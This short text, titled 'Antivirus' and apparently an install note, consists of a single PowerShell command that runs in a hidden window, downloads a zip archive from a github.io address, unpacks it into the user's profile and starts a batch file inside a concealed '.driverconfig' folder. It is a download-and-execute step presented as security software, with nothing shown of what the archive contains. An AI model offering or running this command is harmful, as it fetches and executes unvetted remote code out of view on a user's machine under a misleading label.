# Antivirus

powershell -WindowStyle Hidden -Command "$o=$env:USERPROFILE+'\A.zip'; $e=$env:USERPROFILE+'\A'; (Invoke-WebRequest 'https://jmorg23.github.io/AV/main.zip' -OutFile $o); Expand-Archive $o $e -Force; Start-Process $e\.driverconfig\startcon.bat